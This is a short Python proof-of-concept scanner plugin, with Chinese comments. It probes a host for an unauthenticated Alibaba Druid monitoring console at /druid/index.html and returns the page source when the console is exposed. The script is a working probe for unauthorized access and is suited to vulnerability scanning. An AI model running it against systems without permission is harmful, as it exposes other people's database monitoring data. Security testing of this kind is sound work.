# coding:utf-8  
import requests
from lib.common import url_handle
# ...
import urllib3
urllib3.disable_warnings()
_info = {
    "author" : "jijue",                      # POC作者
    "version" : "1",                    # POC版本，默认是1  
    "CreateDate" : "2021-03-10",        # POC创建时间
    "UpdateDate" : "2021-03-10",        # POC创建时间
    "PocDesc" : """
    略  
    """,                                # POC描述，写更新描述，没有就不写

    "name" : "druid未授权访问",                        # 漏洞名称
    "AppName" : "druid",                     # 漏洞应用名称
    "AppVersion" : "全版本",                  # 漏洞应用版本
    "VulnDate" : "2021-03-10",                    # 漏洞公开的时间,不知道就写能查到的最早的文献日期，格式：xxxx-xx-xx
    "VulnDesc" : """
    Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池。
    Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控。
    当开发者配置不当时就可能造成未授权访问漏洞。
    """,                                # 漏洞简要描述

    "fofa-dork":"",                     # fofa搜索语句
    "example" : "",                     # 存在漏洞的演示url，写一个就可以了
    "exp_img" : "",                      # 先不管  

    "timeout" : 5,
}

def verify(host,proxy):
    """
    返回vuln

    存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

    不存在漏洞：vuln = [False,""]
    """
    vuln = [False,""]
    url = url_handle(host) + "/druid/index.html" # url自己按需调整

    if proxy:
        proxies = {
        "http": "http://%s"%(proxy),
        "https": "http://%s"%(proxy),
        }
    headers = {"User-Agent":"Mozilla/5.0 (Windows ME; U; en) Opera 8.51",
                "Connection":"close"}

    try:
        """
        检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
        """
        req = requests.get(url,headers = headers , timeout = _info["timeout"],verify = False)
        if req.status_code == 200 and "druid.index.init();" in req.text:
            vuln = [True,req.text]
        else:
            vuln = [False,""]
    except Exception as e:
        raise e
    
    return vuln